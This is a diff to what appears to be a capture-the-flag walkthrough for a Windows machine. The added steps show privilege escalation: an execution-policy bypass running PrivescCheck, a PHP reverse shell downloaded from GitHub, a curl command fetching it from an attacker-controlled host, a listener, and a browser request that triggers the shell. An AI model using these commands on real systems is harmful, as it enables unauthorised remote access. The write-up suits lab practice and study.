@@ -169,7 +169,6 @@ Host script results:
 
 <br>
 <h3>Root level flag</h3>
-<h4>Enumeration</h4>
 
 <p>
 
@@ -202,10 +201,14 @@ Host script results:
 - executed: <code>powershell.exe</code><br>
 - executed: <code>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"</code><br>
 - waited ...<br>
-- identified status: <code>Vulnerable - High</code>, Name: <code>Apache 2.4</code>, ImagePath: <code>"C:\xampp\apache\bin\httpd.exe"</code><br>
+- identified status: <code>Vulnerable - High</code>, Name: <code>Apache 2.4</code>, ImagePath: <code>"C:\xampp\apache\bin\httpd.exe"</code><br><br><br>
 - searched for <code>GitHub Windows PHP Reverse Shell</code><br>
 - navigated to <code>https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php</code><br>
 - downloaded <code>php_reverse_shell.php</code><br>
+- updated the IP<br>
+- executed: <code>curl http://xx.xxx.xxx.xx:8000/php_reverse_shell.php -o php_reverse_shell.php</code><br>
+- setup a listener<br>
+- navigated to <code>stealth.com:8080/php_reverse_shell.php</code></p>
 
 <br>
 <br>
